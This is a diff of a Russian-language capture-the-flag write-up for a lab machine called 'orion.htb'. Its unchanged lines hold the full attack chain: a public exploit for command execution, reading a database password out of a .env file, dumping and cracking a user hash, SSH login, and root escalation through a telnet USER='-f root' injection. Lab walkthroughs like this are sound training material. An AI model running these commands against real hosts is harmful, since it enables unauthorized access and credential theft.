@@ -27,7 +27,7 @@
 
 ### Nmap Scan
 
-bash
+``bash
 nmap -sC -sV -p- 10.129.93.166
 Port	Service	Version
 22/tcp	SSH	OpenSSH 8.9p1
@@ -37,7 +37,7 @@ Port	Service	Version
 
 Используем публичный эксплойт:
 
-bash
+``bash
 python3 exploit.py -u http://orion.htb -c "id"
 Результат:
 
@@ -47,7 +47,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ##🗄️ MySQL — пароль из .env
 Через тот же эксплойт читаем .env:
 
-bash
+``bash
 python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
 Найден пароль:
 
@@ -56,19 +56,19 @@ CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
 ---
 Подключаемся к MySQL и извлекаем хеш пароля пользователя adam:
 
-bash
+``bash
 python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
 Хеш взломан через John/Hashcat → darkangel.
 ---
 ##🔑 SSH — доступ как adam
-bash
+``bash
 ssh adam@10.129.93.166
 Password: darkangel
 ---
 ##🔐 Privilege Escalation — Telnet CVE-2026-24061
 Проверяем локальные порты:
 
-bash
+``bash
 netstat -tulpn | grep 23
 Результат:
 
@@ -77,15 +77,15 @@ tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN
 ---
 Эксплуатируем:
 
-bash
+``bash
 env USER='-f root' telnet -a 127.0.0.1
 ---
 ##🏁 Flags
-bash
+``bash
 cat /home/adam/user.txt
 cat /root/root.txt
 ###📎 All Commands
-bash
+`bash
 nmap -sC -sV -p- 10.129.93.166
 python3 exploit.py -u http://orion.htb -c "id"
 python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
